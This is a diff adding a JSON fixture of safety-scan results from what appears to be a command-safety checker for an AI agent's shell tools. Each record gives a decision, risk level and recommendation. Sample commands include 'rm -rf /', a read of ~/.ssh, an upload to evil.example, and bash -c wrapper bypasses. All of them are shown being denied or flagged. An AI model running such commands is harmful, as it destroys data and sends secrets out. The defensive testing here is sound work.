@@ -1,0 +1,346 @@
+[
+  {
+    "schema_version": 1,
+    "scan_id": "scan-1",
+    "decision": "allow",
+    "risk_level": "low",
+    "rule_id": "safety.no_findings",
+    "evidence": [
+      "no safety policy findings"
+    ],
+    "recommendation": "execution is permitted",
+    "tool_name": "workspace_exec",
+    "command": "go test ./tool/safety",
+    "backend": "workspaceexec",
+    "blocked": false,
+    "redacted": false,
+    "duration_ms": 0,
+    "safe_summary": "request is permitted"
+  },
+  {
+    "schema_version": 1,
+    "scan_id": "scan-2",
+    "decision": "deny",
+    "risk_level": "critical",
+    "rule_id": "dangerous.rm_rf",
+    "evidence": [
+      "rm -rf targets /"
+    ],
+    "recommendation": "remove the root operand and use a narrowly scoped path",
+    "tool_name": "workspace_exec",
+    "command": "rm -rf /",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "safe_summary": "request requires safety policy action",
+    "findings": [
+      {
+        "decision": "deny",
+        "risk_level": "critical",
+        "rule_id": "dangerous.rm_rf",
+        "evidence": [
+          "rm -rf targets /"
+        ],
+        "recommendation": "remove the root operand and use a narrowly scoped path"
+      },
+      {
+        "decision": "deny",
+        "risk_level": "high",
+        "rule_id": "sensitive.path",
+        "evidence": [
+          "path matches denied_paths: /"
+        ],
+        "recommendation": "use a path outside the denied_paths policy"
+      }
+    ]
+  },
+  {
+    "schema_version": 1,
+    "scan_id": "scan-3",
+    "decision": "deny",
+    "risk_level": "high",
+    "rule_id": "sensitive.path",
+    "evidence": [
+      "path matches denied_paths: ~/.ssh"
+    ],
+    "recommendation": "use a path outside the denied_paths policy",
+    "tool_name": "workspace_exec",
+    "command": "cat [REDACTED]",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "redacted": true,
+    "duration_ms": 0,
+    "safe_summary": "request requires safety policy action",
+    "findings": [
+      {
+        "decision": "deny",
+        "risk_level": "high",
+        "rule_id": "sensitive.path",
+        "evidence": [
+          "path matches denied_paths: ~/.ssh"
+        ],
+        "recommendation": "use a path outside the denied_paths policy"
+      }
+    ]
+  },
+  {
+    "schema_version": 1,
+    "scan_id": "scan-4",
+    "decision": "deny",
+    "risk_level": "high",
+    "rule_id": "network.destination",
+    "evidence": [
+      "network destination is not allowlisted: evil.example"
+    ],
+    "recommendation": "add the trusted host to network_allowlist or remove the network request",
+    "tool_name": "workspace_exec",
+    "command": "curl https://evil.example/upload",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "safe_summary": "request requires safety policy action",
+    "findings": [
+      {
+        "decision": "deny",
+        "risk_level": "high",
+        "rule_id": "network.destination",
+        "evidence": [
+          "network destination is not allowlisted: evil.example"
+        ],
+        "recommendation": "add the trusted host to network_allowlist or remove the network request"
+      }
+    ]
+  },
+  {
+    "schema_version": 1,
+    "scan_id": "scan-5",
+    "decision": "allow",
+    "risk_level": "low",
+    "rule_id": "safety.no_findings",
+    "evidence": [
+      "no safety policy findings"
+    ],
+    "recommendation": "execution is permitted",
+    "tool_name": "workspace_exec",
+    "command": "curl https://api.github.com/repos/trpc-group/trpc-agent-go",
+    "backend": "workspaceexec",
+    "blocked": false,
+    "redacted": false,
+    "duration_ms": 0,
+    "safe_summary": "request is permitted"
+  },
+  {
+    "schema_version": 1,
+    "scan_id": "scan-6",
+    "decision": "deny",
+    "risk_level": "high",
+    "rule_id": "shell.parse_error",
+    "evidence": [
+      "command \"bash\" is denied by built-in policy because it is a shell wrapper or re-executing builtin that can bypass the allow/deny list (eval curl ..., sh -c '...', busybox sh ..., xargs ..., env CMD ..., sudo ..., etc.). This deny is unconditional under policy mode; wrap the desired use in an auditable workspace script and allow the script instead."
+    ],
+    "recommendation": "run the auditable command directly instead of a shell wrapper",
+    "tool_name": "workspace_exec",
+    "command": "bash -c 'echo hidden'",
+    "backend": "workspaceexec",
+    "blocked": true,
+    "redacted": false,
+    "duration_ms": 0,
+    "safe_summary": "request requires safety policy action",
+    "findings": [
+      {
+        "decision": "deny",
+        "risk_level": "high",
+        "rule_id": "shell.parse_error",
+        "evidence": [
+          "command \"bash\" is denied by built-in policy because it is a shell wrapper or re-executing builtin that can bypass the allow/deny list (eval curl ..., sh -c '...', busybox sh ..., xargs ..., env CMD ..., sudo ..., etc.). This deny is unconditional under policy mode; wrap the desired use in an auditable workspace script and allow the script instead."
+        ],
+        "recommendation": "run the auditable command directly instead of a shell wrapper"
+      }
+    ]
+  },
+  {
+    "schema_version": 1,
+    "scan_id": "scan-7",
+    "decision": "needs_human_review",
+    "risk_level": "medium",
+    "rule_id": "shell.pipeline",
+    "evidence": [
+      "command contains an unquoted pipeline"
+    ],
+    "recommendation": "review each pipeline segment before execution",
+    "tool_name": "workspace_exec",
+    "command": "cat README.md | wc -l",
+    "backend": "workspaceexec",
+    "blocked": false,
+    "redacted": false,
+    "duration_ms": 0,
+    "safe_summary": "request requires safety policy action",
+    "findings": [
+      {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "rule_id": "shell.pipeline",
+        "evidence": [
+          "command contains an unquoted pipeline"
+        ],
+        "recommendation": "review each pipeline segment before execution"
+      }
+    ]
+  },
+  {
+    "schema_version": 1,
+    "scan_id": "scan-8",
+    "decision": "needs_human_review",
+    "risk_level": "high",
+    "rule_id": "dependency.install",
+    "evidence": [
+      "command installs dependencies or mutates the execution environment"
+    ],
+    "recommendation": "pin and review dependencies before changing the environment",
+    "tool_name": "workspace_exec",
+    "command": "go install example.com/tool@latest",
+    "backend": "workspaceexec",
+    "blocked": false,
+    "redacted": false,
+    "duration_ms": 0,
+    "safe_summary": "request requires safety policy action",
+    "findings": [
+      {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "rule_id": "command.review",
+        "evidence": [
+          "command matches review_commands"
+        ],
+        "recommendation": "review the command before execution"
+      },
+      {
+        "decision": "needs_human_review",
+        "risk_level": "high",
+        "rule_id": "dependency.install",
+        "evidence": [
+          "command installs dependencies or mutates the execution environment"
+        ],
+        "recommendation": "pin and review dependencies before changing the environment"
+      }
+    ]
+  },
+  {
+    "schema_version": 1,
+    "scan_id": "scan-9",
+    "decision": "needs_human_review",
+    "risk_level": "medium",
+    "rule_id": "resource.long_running",
+    "evidence": [
+      "sleep duration exceeds the configured execution timeout"
+    ],
+    "recommendation": "reduce the sleep duration and use a bounded timeout",
+    "tool_name": "workspace_exec",
+    "command": "sleep 60",
+    "backend": "workspaceexec",
+    "blocked": false,
+    "redacted": false,
+    "duration_ms": 0,
+    "safe_summary": "request requires safety policy action",
+    "findings": [
+      {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "rule_id": "resource.long_running",
+        "evidence": [
+          "sleep duration exceeds the configured execution timeout"
+        ],
+        "recommendation": "reduce the sleep duration and use a bounded timeout"
+      }
+    ]
+  },
+  {
+    "schema_version": 1,
+    "scan_id": "scan-10",
+    "decision": "needs_human_review",
+    "risk_level": "high",
+    "rule_id": "resource.large_output",
+    "evidence": [
+      "command can generate unbounded output"
+    ],
+    "recommendation": "replace the output generator with a bounded command",
+    "tool_name": "workspace_exec",
+    "command": "yes",
+    "backend": "workspaceexec",
+    "blocked": false,
+    "redacted": false,
+    "duration_ms": 0,
+    "safe_summary": "request requires safety policy action",
+    "findings": [
+      {
+        "decision": "needs_human_review",
+        "risk_level": "high",
+        "rule_id": "resource.large_output",
+        "evidence": [
+          "command can generate unbounded output"
+        ],
+        "recommendation": "replace the output generator with a bounded command"
+      }
+    ]
+  },
+  {
+    "schema_version": 1,
+    "scan_id": "scan-11",
+    "decision": "needs_human_review",
+    "risk_level": "high",
+    "rule_id": "host.tty",
+    "evidence": [
+      "host execution requested a persistent PTY session"
+    ],
+    "recommendation": "review session lifetime, cleanup, and host access before execution",
+    "tool_name": "host_exec",
+    "command": "go test ./tool/safety",
+    "backend": "hostexec",
+    "blocked": false,
+    "redacted": false,
+    "duration_ms": 0,
+    "safe_summary": "request requires safety policy action",
+    "findings": [
+      {
+        "decision": "needs_human_review",
+        "risk_level": "high",
+        "rule_id": "host.tty",
+        "evidence": [
+          "host execution requested a persistent PTY session"
+        ],
+        "recommendation": "review session lifetime, cleanup, and host access before execution"
+      }
+    ]
+  },
+  {
+    "schema_version": 1,
+    "scan_id": "scan-12",
+    "decision": "ask",
+    "risk_level": "high",
+    "rule_id": "shell.parse_error",
+    "evidence": [
+      "parameter expansion '$VAR' is not allowed"
+    ],
+    "recommendation": "use a structurally safe shell command",
+    "tool_name": "workspace_exec",
+    "command": "echo $HOME",
+    "backend": "workspaceexec",
+    "blocked": false,
+    "redacted": false,
+    "duration_ms": 0,
+    "safe_summary": "request requires safety policy action",
+    "findings": [
+      {
+        "decision": "ask",
+        "risk_level": "high",
+        "rule_id": "shell.parse_error",
+        "evidence": [
+          "parameter expansion '$VAR' is not allowed"
+        ],
+        "recommendation": "use a structurally safe shell command"
+      }
+    ]
+  }
+]
